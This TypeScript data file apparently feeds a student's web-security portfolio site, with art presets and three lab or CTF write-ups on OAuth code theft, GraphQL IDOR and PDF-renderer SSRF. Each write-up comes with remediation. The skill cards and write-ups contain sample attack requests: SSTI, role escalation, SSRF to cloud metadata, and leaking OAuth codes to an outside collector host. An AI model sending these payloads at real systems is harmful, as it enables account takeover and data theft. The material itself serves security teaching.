import zeusRaysImg from '../assets/images/zeus_alchemical_rays_1793287791703.jpg';
import athenaRaysImg from '../assets/images/athena_alchemical_rays_1793287794805.jpg';
import apolloRaysImg from '../assets/images/apollo_alchemical_rays_1793287796902.jpg';
import poseidonRaysImg from '../assets/images/poseidon_alchemical_rays_1793287799742.jpg';
import bgDitheredZeusImg from '../assets/images/bg_dithered_zeus_terminals_1793288416314.jpg';
import cavalierNousExactImg from '../assets/images/cavalier_nous_exact_v2_16x9.jpg';

export enum WriteupCategory {
  ALL = 'All Writeups',
  AUTH = 'Auth & Session',
  SERVER = 'Server-Side',
  CLIENT_API = 'Client-Side & API',
}

export type GodPresetKey = 'athena' | 'apollo' | 'poseidon' | 'ares' | 'hermes' | 'zeus';

export interface GodArtworkOption {
  key: GodPresetKey;
  label: string;
  domain: string;
  src: string;
  posterSrc: string;
  alt: string;
}

const EXACT_WRITEUP_CARD_1 = '/assets/aistudio/hermes_writeup_card_1.png';
const EXACT_WRITEUP_CARD_2 = '/assets/aistudio/hermes_writeup_card_2.png';
const EXACT_WRITEUP_CARD_3 = '/assets/aistudio/hermes_writeup_card_3.png';

export const GREEK_GOD_PRESETS: Record<GodPresetKey, GodArtworkOption> = {
  athena: {
    key: 'athena',
    label: 'Plate 01 · Optical Ray & Orb',
    domain: 'Auth & Session Flow',
    src: EXACT_WRITEUP_CARD_1,
    posterSrc: EXACT_WRITEUP_CARD_1,
    alt: 'Electric-blue pixel-dithered classical figure with optical rays and sphere',
  },
  apollo: {
    key: 'apollo',
    label: 'Plate 02 · CRT Classical Bust',
    domain: 'API & Access Control',
    src: EXACT_WRITEUP_CARD_2,
    posterSrc: EXACT_WRITEUP_CARD_2,
    alt: 'Electric-blue horizontal-scanline dithered classical sculpture face',
  },
  poseidon: {
    key: 'poseidon',
    label: 'Plate 03 · Hermes Spark',
    domain: 'Server-Side & Execution',
    src: EXACT_WRITEUP_CARD_3,
    posterSrc: EXACT_WRITEUP_CARD_3,
    alt: 'Electric-blue dithered classical and armored hand spark engraving',
  },
  ares: {
    key: 'ares',
    label: 'Plate 01 · Optical Ray & Orb',
    domain: 'Client-Side & DOM',
    src: EXACT_WRITEUP_CARD_1,
    posterSrc: EXACT_WRITEUP_CARD_1,
    alt: 'Electric-blue pixel-dithered classical figure with optical rays and sphere',
  },
  zeus: {
    key: 'zeus',
    label: 'Plate 02 · CRT Classical Bust',
    domain: 'Sovereign Authority',
    src: EXACT_WRITEUP_CARD_2,
    posterSrc: EXACT_WRITEUP_CARD_2,
    alt: 'Electric-blue horizontal-scanline dithered classical sculpture face',
  },
  hermes: {
    key: 'hermes',
    label: 'Plate 03 · Armored Spark',
    domain: 'Protocol & Relay',
    src: EXACT_WRITEUP_CARD_3,
    posterSrc: EXACT_WRITEUP_CARD_3,
    alt: 'Electric-blue dithered classical and armored hand spark engraving',
  },
};

export const EXACT_INDRA_BLUE_PANELS_CLEAN_16X9 =
  '/assets/aistudio/indra_blue_16x9_panels_a6a7bc4a.png';

export const EXACT_VISHNU_BLUE_16X9 =
  '/assets/aistudio/vishnu_blue_16x9_06db4dc2.png';

export const EXACT_INDRA_BLUE_PANELS_16X9 =
  '/assets/aistudio/indra_blue_16x9_panels_57437f41.png';

export const EXACT_INDRA_BLUE_16X9 =
  '/assets/aistudio/indra_blue_16x9_c3b3f3d6.png';

export const EXACT_BLUE_HALFTONE_HORSEMAN_16X9 =
  '/assets/aistudio/blue_halftone_horseman_16x9_f676a829.png';

export const BACKGROUND_ARTWORKS = {
  indraBluePanelsClean16x9: EXACT_INDRA_BLUE_PANELS_CLEAN_16X9,
  vishnuBlue16x9: EXACT_VISHNU_BLUE_16X9,
  indraBluePanels16x9: EXACT_INDRA_BLUE_PANELS_16X9,
  indraBlue16x9: EXACT_INDRA_BLUE_16X9,
  blueHalftoneHorseman: EXACT_BLUE_HALFTONE_HORSEMAN_16X9,
  cavalierCyberCrt: cavalierNousExactImg,
  originalCavalierCrt: '/assets/aistudio/image_7dfe2fff_c144e28e.jpg',
  ditheredZeus: bgDitheredZeusImg,
  primary: apolloRaysImg,
  secondary: zeusRaysImg,
  tertiary: poseidonRaysImg,
  quaternary: athenaRaysImg,
};

export const HERO_ARTWORK = {
  src: zeusRaysImg,
  alt: 'Alchemical woodcut and copperplate engraving of Zeus inside a lightning-veined square and sunburst ring hurling geometric rays',
};

export interface WebSecSkill {
  id: string;
  index: string;
  title: string;
  summary: string;
  methodology: string;
  focusAreas: string;
  workflowSteps: [string, string, string, string];
  httpSnippet: string;
}

export interface BuiltInGalleryPlate {
  id: string;
  label: string;
  subtitle: string;
  src: string;
  godPreset: GodPresetKey;
  useAsCustomUrl: boolean;
}

export const BUILT_IN_WRITEUP_GALLERY: BuiltInGalleryPlate[] = [
  {
    id: 'plate-01',
    label: 'Plate 01 · Optical Ray & Orb',
    subtitle: 'Default Blue Dither',
    src: EXACT_WRITEUP_CARD_1,
    godPreset: 'athena',
    useAsCustomUrl: false,
  },
  {
    id: 'plate-02',
    label: 'Plate 02 · CRT Classical Bust',
    subtitle: 'Default Blue Dither',
    src: EXACT_WRITEUP_CARD_2,
    godPreset: 'apollo',
    useAsCustomUrl: false,
  },
  {
    id: 'plate-03',
    label: 'Plate 03 · Armored Spark',
    subtitle: 'Default Blue Dither',
    src: EXACT_WRITEUP_CARD_3,
    godPreset: 'poseidon',
    useAsCustomUrl: false,
  },
  {
    id: 'engraving-zeus',
    label: 'Zeus · Ray-Burst Engraving',
    subtitle: 'Alchemical Woodcut',
    src: zeusRaysImg,
    godPreset: 'zeus',
    useAsCustomUrl: true,
  },
  {
    id: 'engraving-athena',
    label: 'Athena · Sovereign Shield',
    subtitle: 'Alchemical Woodcut',
    src: athenaRaysImg,
    godPreset: 'athena',
    useAsCustomUrl: true,
  },
  {
    id: 'engraving-apollo',
    label: 'Apollo · Solar Optics',
    subtitle: 'Alchemical Woodcut',
    src: apolloRaysImg,
    godPreset: 'apollo',
    useAsCustomUrl: true,
  },
  {
    id: 'engraving-poseidon',
    label: 'Poseidon · Trident Abyss',
    subtitle: 'Alchemical Woodcut',
    src: poseidonRaysImg,
    godPreset: 'poseidon',
    useAsCustomUrl: true,
  },
];

export type SiteMediaSlotId = 'background' | 'hero' | 'closingBanner';

export interface SiteMediaState {
  imageUrl: string;
  blendMode: 'normal' | 'lighten';
}

export interface SiteMediaPreset {
  id: string;
  label: string;
  subtitle: string;
  src: string;
  recommendedBlend: 'normal' | 'lighten';
}

export const SITE_MEDIA_PRESETS: SiteMediaPreset[] = [
  {
    id: 'indra-blue-panels-clean-16x9',
    label: 'Indra & Terminal Panels · 16:9',
    subtitle: 'Default Background & Closing Banner',
    src: EXACT_INDRA_BLUE_PANELS_CLEAN_16X9,
    recommendedBlend: 'normal',
  },
  {
    id: 'indra-blue-16x9',
    label: 'Indra · Celestial Halftone 16:9',
    subtitle: 'Alternate Clean Halftone',
    src: EXACT_INDRA_BLUE_16X9,
    recommendedBlend: 'normal',
  },
  {
    id: 'indra-blue-panels-16x9',
    label: 'Indra & Inscribed Panels · 16:9',
    subtitle: 'Alternate Panels Variant',
    src: EXACT_INDRA_BLUE_PANELS_16X9,
    recommendedBlend: 'normal',
  },
  {
    id: 'vishnu-blue-16x9',
    label: 'Maha-Vishnu · Cosmic Ocean 16:9',
    subtitle: 'Alternate 16:9 Halftone',
    src: EXACT_VISHNU_BLUE_16X9,
    recommendedBlend: 'normal',
  },
  {
    id: 'blue-halftone-horseman-16x9',
    label: 'Blue Halftone Horseman · 16:9',
    subtitle: 'Alternate 16:9 Halftone',
    src: EXACT_BLUE_HALFTONE_HORSEMAN_16X9,
    recommendedBlend: 'normal',
  },
  {
    id: 'cavalier-cyber-crt-16x9',
    label: 'Horseman & CRT Terminals · 16:9',
    subtitle: 'Alternate Blue Dither',
    src: cavalierNousExactImg,
    recommendedBlend: 'normal',
  },
  {
    id: 'cavalier-original-crt',
    label: 'Horseman · Portrait Scanline',
    subtitle: 'Uploaded Scanline Plate',
    src: '/assets/aistudio/image_7dfe2fff_c144e28e.jpg',
    recommendedBlend: 'normal',
  },
  {
    id: 'zeus-hero-rays',
    label: 'Zeus · Ray-Burst Engraving',
    subtitle: 'Default Hero Woodcut',
    src: zeusRaysImg,
    recommendedBlend: 'lighten',
  },
  {
    id: 'athena-rays',
    label: 'Athena · Sovereign Shield',
    subtitle: 'Alchemical Woodcut',
    src: athenaRaysImg,
    recommendedBlend: 'lighten',
  },
  {
    id: 'apollo-rays',
    label: 'Apollo · Solar Optics',
    subtitle: 'Alchemical Woodcut',
    src: apolloRaysImg,
    recommendedBlend: 'lighten',
  },
  {
    id: 'poseidon-rays',
    label: 'Poseidon · Trident Abyss',
    subtitle: 'Alchemical Woodcut',
    src: poseidonRaysImg,
    recommendedBlend: 'lighten',
  },
  {
    id: 'dithered-zeus-terminals',
    label: 'Zeus · Dithered Terminals',
    subtitle: 'Cobalt Dither Wallpaper',
    src: bgDitheredZeusImg,
    recommendedBlend: 'normal',
  },
];

export const MAX_CUSTOM_IMAGE_URL_LENGTH = 240000;
export const MAX_SITE_MEDIA_URL_LENGTH = 420000;

function hasAllowedImageScheme(url: string): boolean {
  return (
    url.startsWith('https://') ||
    url.startsWith('http://') ||
    url.startsWith('/assets/') ||
    url.startsWith('/src/assets/') ||
    url.startsWith('data:image/jpeg;base64,') ||
    url.startsWith('data:image/webp;base64,') ||
    url.startsWith('data:image/png;base64,')
  );
}

export function isValidCustomImageUrlClient(url: string): boolean {
  if (url.length > MAX_CUSTOM_IMAGE_URL_LENGTH) return false;
  if (url.length === 0) return true;
  return hasAllowedImageScheme(url);
}

export function isValidSiteMediaUrlClient(url: string): boolean {
  if (url.length > MAX_SITE_MEDIA_URL_LENGTH) return false;
  if (url.length === 0) return true;
  return hasAllowedImageScheme(url);
}

export interface SecurityWriteup {
  id: string;
  index: string;
  title: string;
  subtitle: string;
  category: Exclude<WriteupCategory, WriteupCategory.ALL>;
  date: string;
  environment: string;
  owaspMapping: string;
  readTime: string;
  godPreset: GodPresetKey;
  customImageUrl?: string;
  visibility: 'public' | 'draft';
  order: number;
  summary: string;
  vulnerabilityRootCause: string;
  exploitationChain: string[];
  remediation: string;
  httpPoc: string;
  curlVerify: string;
}

const DEFAULT_FALLBACK_PLATES = [
  EXACT_WRITEUP_CARD_1,
  EXACT_WRITEUP_CARD_2,
  EXACT_WRITEUP_CARD_3,
];

export function resolveWriteupImageSrc(writeup: SecurityWriteup, cardPosition = 0): string {
  const custom = writeup.customImageUrl?.trim();
  if (custom && isValidCustomImageUrlClient(custom)) {
    return custom;
  }
  const presetArt = GREEK_GOD_PRESETS[writeup.godPreset];
  return (
    presetArt?.posterSrc ??
    DEFAULT_FALLBACK_PLATES[cardPosition % DEFAULT_FALLBACK_PLATES.length]
  );
}

export const STUDENT_HIGHLIGHTS = [
  {
    value: 'OWASP Top 10',
    label: 'Manual Web Application Penetration Testing & Source-Assisted Auditing',
  },
  {
    value: '40+ Labs',
    label: 'PortSwigger Web Security Academy, Hack The Box & CTF Challenges Solved',
  },
  {
    value: 'HTTP / API',
    label: 'Deep Inspection of REST, GraphQL, JWT, OAuth 2.0 & Session Flows',
  },
  {
    value: 'Clear PoCs',
    label: 'Reproducible Vulnerability Writeups Paired with Actionable Remediation',
  },
];

export const WEBSEC_SKILLS: WebSecSkill[] = [
  {
    id: 'skill-auth',
    index: '01',
    title: 'Authentication & Session Security',
    summary:
      'Auditing OAuth 2.0 flows, JWT signature verification, password reset logic, and multi-step session state transitions.',
    methodology:
      'Map every token issuance and validation boundary across cookies, Authorization headers, and OAuth redirect URIs to uncover algorithm confusion, unvalidated state parameters, and session fixation flaws.',
    focusAreas: 'OAuth 2.0 · JWT None/RS256-to-HS256 · MFA Bypass · Cookie Flags',
    workflowSteps: ['Token Enumeration', 'Redirect & State Audit', 'Signature Mutation', 'Privilege Verification'],
    httpSnippet: `GET /oauth/authorize?client_id=web-portal
  &response_type=code
  &redirect_uri=https://target.lab/callback/..%2fprofile
  &state=predictable_csrf_token HTTP/1.1
Host: auth.target.lab`,
  },
  {
    id: 'skill-access-control',
    index: '02',
    title: 'Broken Access Control & IDOR',
    summary:
      'Testing horizontal and vertical authorization boundaries, multi-tenant isolation, and mass assignment in modern web apps.',
    methodology:
      'Compare low-privilege, cross-tenant, and unauthenticated sessions side-by-side using Burp Autorize matrices to detect missing object-level ownership checks and hidden administrative parameters.',
    focusAreas: 'BOLA / IDOR · Mass Assignment · Path Traversal · Role Escalation',
    workflowSteps: ['Role Matrix Mapping', 'UUID & Parameter Diffing', 'Method Override Test', 'Tenant Boundary Proof'],
    httpSnippet: `PATCH /api/v2/organizations/org_8841/members/me HTTP/1.1
Host: app.target.lab
Content-Type: application/json

{"displayName": "sarmansinh", "role": "org_owner"}`,
  },
  {
    id: 'skill-injection',
    index: '03',
    title: 'SQLi, SSTI & Server-Side Injection',
    summary:
      'Identifying parameterized query bypasses, blind boolean/time-based SQL injection, template injection, and XXE parsers.',
    methodology:
      'Trace user-controlled sinks into ORM raw clauses, server-side template engines (Jinja2, Twig, EJS), and XML/PDF generators using differential timing probes and out-of-band DNS interactions.',
    focusAreas: 'Blind SQLi · Server-Side Template Injection · XXE · Command Injection',
    workflowSteps: ['Input Sink Discovery', 'Differential Time Probes', 'Context-Safe Extraction', 'Parameterized Fix'],
    httpSnippet: `POST /reports/preview HTTP/1.1
Host: portal.target.lab
Content-Type: application/x-www-form-urlencoded

template_header={{request.application.__globals__.__builtins__}}`,
  },
  {
    id: 'skill-ssrf',
    index: '04',
    title: 'SSRF & Request Smuggling',
    summary:
      'Probing webhook fetchers, PDF renderers, URL importers, and reverse-proxy parsing discrepancies.',
    methodology:
      'Evaluate URL parsers against IPv6/octal encodings, open-redirect chains, DNS rebinding, and CL.TE / HTTP/2 downgrade desynchronization between edge proxies and backend servers.',
    focusAreas: 'Blind & Full SSRF · Cloud Metadata · DNS Rebinding · HTTP Desync',
    workflowSteps: ['Outbound Sink Audit', 'Allowlist Parser Differential', 'OOB Callback Proof', 'Egress Hardening'],
    httpSnippet: `POST /api/webhooks/test-delivery HTTP/1.1
Host: studio.target.lab
Content-Type: application/json

{"endpoint": "https://redirect.lab/302?to=http://169.254.169.254/latest/meta-data/"}`,
  },
  {
    id: 'skill-client-side',
    index: '05',
    title: 'XSS, CSRF & Client-Side DOM Security',
    summary:
      'Analyzing DOM sinks, postMessage listeners, Content Security Policy weaknesses, and cross-origin state mutations.',
    methodology:
      'Inspect client bundles and source maps for unsanitized innerHTML, location.hash routing sinks, permissive postMessage origin regexes, and SameSite=Lax top-level navigation gadgets.',
    focusAreas: 'DOM & Stored XSS · postMessage Exploitation · CSP Bypass · CSRF',
    workflowSteps: ['Bundle Source Audit', 'Sink-to-Source Taint Trace', 'CSP Policy Review', 'DOMPurify Hardening'],
    httpSnippet: `// Vulnerable origin check discovered during bundle review:
window.addEventListener("message", (event) => {
  if (event.origin.indexOf("target.lab") !== -1) {
    document.getElementById("notice").innerHTML = event.data.banner;
  }
});`,
  },
  {
    id: 'skill-api-recon',
    index: '06',
    title: 'API, GraphQL & Recon Methodology',
    summary:
      'Attack-surface mapping, GraphQL schema introspection, rate-limit race conditions, and Burp Suite workflow automation.',
    methodology:
      'Combine passive subdomain/endpoint enumeration, JavaScript route extraction, GraphQL batching/aliasing analysis, and single-packet HTTP/2 race condition testing.',
    focusAreas: 'GraphQL Security · HTTP/2 Race Conditions · JS Endpoint Recon · Burp Suite',
    workflowSteps: ['Subdomain & JS Recon', 'Schema & Route Mapping', 'Single-Packet Race Test', 'Triage Report'],
    httpSnippet: `POST /graphql HTTP/2
Host: api.target.lab
Content-Type: application/json

{"query":"query { __schema { types { name fields { name } } } }"}`,
  },
];

export const INITIAL_WRITEUPS: SecurityWriteup[] = [
  {
    id: 'writeup-oauth-account-takeover',
    index: '01',
    title: 'OAuth Redirect Takeover',
    subtitle: 'Chaining path-traversal redirect_uri normalization with unbound OAuth state to leak authorization codes',
    category: WriteupCategory.AUTH,
    date: 'September 2026',
    environment: 'WebSec Lab Research',
    owaspMapping: 'OWASP A07 · Auth Failures',
    readTime: '7 min read',
    godPreset: 'athena',
    visibility: 'public',
    order: 1,
    summary:
      'Deep-dive analysis of an OAuth 2.0 authorization code flow where prefix-only redirect_uri validation combined with client-side router path normalization allowed stealing unused authorization codes.',
    vulnerabilityRootCause:
      'The authorization server validated redirect_uri using a startsWith("https://app.target.lab/auth/callback") check without canonicalizing dot-segments, while the SPA router resolved /auth/callback/../../u/attacker to a user-editable markdown bio page that loaded external images with a leaky Referrer-Policy.',
    exploitationChain: [
      'Identified that the OAuth provider accepted URL-encoded dot segments (%2f..%2f) inside redirect_uri while preserving the query string on 302 redirect.',
      'Hosted an external image tag inside a public user profile bio after noticing the page lacked Referrer-Policy: no-referrer.',
      'Crafted an authorization URL pointing redirect_uri to /auth/callback/..%2f..%2fu/sarmansinh-poc, leaking ?code= via the HTTP Referer header upon victim navigation.',
      'Exchanged the captured authorization code at /oauth/token before expiration to obtain a full session bearer token.',
    ],
    remediation:
      'Enforce exact byte-for-byte allowlist matching on canonicalized redirect_uri values, require PKCE (S256) on all public and SPA clients, bind state strictly to the user’s pre-auth session cookie, and set Referrer-Policy: strict-origin-when-cross-origin globally.',
    curlVerify: `curl -i "https://auth.target.lab/oauth/authorize?client_id=spa_web&response_type=code&redirect_uri=https://app.target.lab/auth/callback/..%2f..%2fu/poc"`,
    httpPoc: `HTTP/1.1 302 Found
Location: https://app.target.lab/auth/callback/../../u/poc?code=4f92a8c1e90b41d2
Cache-Control: no-store

# Outbound image request from victim browser leaks code in Referer:
GET /pixel.png HTTP/1.1
Host: collector.lab.local
Referer: https://app.target.lab/u/poc?code=4f92a8c1e90b41d2`,
  },
  {
    id: 'writeup-graphql-idor-batching',
    index: '02',
    title: 'GraphQL Tenant IDOR',
    subtitle: 'Bypassing REST workspace filters via undocumented GraphQL Relay Global Object ID resolution',
    category: WriteupCategory.CLIENT_API,
    date: 'August 2026',
    environment: 'University CTF Finals · 1st Blood',
    owaspMapping: 'OWASP API1 · BOLA',
    readTime: '6 min read',
    godPreset: 'apollo',
    visibility: 'public',
    order: 2,
    summary:
      'While REST endpoints enforced strict workspace middleware checks, an internal /graphql gateway exposed a generic node(id:) resolver that decoded Base64 Relay IDs without verifying tenant membership.',
    vulnerabilityRootCause:
      'Authorization middleware was attached at the Express REST controller layer rather than the data-loader model layer. The newly introduced GraphQL node(id: ID!) interface queried the ORM directly by primary key.',
    exploitationChain: [
      'Extracted an unreferenced /api/internal/graphql endpoint from a lazy-loaded admin JavaScript chunk.',
      'Decoded sample Relay cursor strings and observed predictable Base64 patterns: Invoice:1042, Invoice:1043.',
      'Queried node(id: "SW52b2ljZToxMDQ0") from a separate sandbox tenant account and retrieved private billing metadata and signed export tokens.',
    ],
    remediation:
      'Move tenant and ownership authorization checks into the repository/DataLoader layer so every GraphQL field and REST handler enforces identical ViewerContext permissions, and disable introspection in production.',
    curlVerify: `curl -X POST https://api.target.lab/graphql -H "Authorization: Bearer $LOW_PRIV_JWT" -H "Content-Type: application/json" -d '{"query":"{ node(id: \\"SW52b2ljZToxMDQ0\\") { ... on Invoice { id amount downloadUrl } } }"}'`,
    httpPoc: `POST /api/internal/graphql HTTP/2
Host: api.target.lab
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "query": "query InspectNode($id: ID!) { node(id: $id) { ... on Invoice { id customerEmail secretNotes } } }",
  "variables": { "id": "SW52b2ljZToxMDQ0" }
}`,
  },
  {
    id: 'writeup-pdf-headless-ssrf',
    index: '03',
    title: 'Headless PDF SSRF',
    subtitle: 'Escalating HTML-to-PDF export into internal microservice SSRF via HTTP 307 redirects',
    category: WriteupCategory.SERVER,
    date: 'June 2026',
    environment: 'Hack The Box · Web Challenge',
    owaspMapping: 'OWASP A10 · SSRF',
    readTime: '8 min read',
    godPreset: 'poseidon',
    visibility: 'public',
    order: 3,
    summary:
      'Bypassing a server-side URL allowlist in an invoice branding previewer where initial DNS resolution passed validation, but headless browser subresource fetches followed HTTP 307 redirects to 127.0.0.1.',
    vulnerabilityRootCause:
      'Time-of-check to time-of-use (TOCTOU) gap: the backend validated the user-supplied logo URL with Python urllib before passing the raw HTML template to a headless renderer that followed arbitrary redirects on <iframe src> elements.',
    exploitationChain: [
      'Confirmed headless Chromium user-agent via an external webhook listener when submitting a custom company logo URL.',
      'Injected an <iframe> inside the unescaped invoice footer field pointing to an external endpoint returning 307 Temporary Redirect to http://127.0.0.1:5000/debug/vars.',
      'Downloaded the rendered PDF invoice containing the full internal Go expvar configuration and challenge flag.',
    ],
    remediation:
      'Sanitize HTML templates strictly before PDF rendering, run headless browsers inside an isolated network namespace with egress blocked to RFC1918/loopback ranges, and validate resolved socket IPs on every hop.',
    curlVerify: `curl -X POST https://billing.target.lab/api/invoices/pdf -H "Content-Type: application/json" -d '{"footerHtml":"<iframe width=600 height=400 src=\\"https://poc.lab/redirect-loopback\\"></iframe>"}' --output leak.pdf`,
    httpPoc: `# External redirector response served to headless renderer:
HTTP/1.1 307 Temporary Redirect
Location: http://127.0.0.1:5000/debug/vars
Access-Control-Allow-Origin: *`,
  },
];
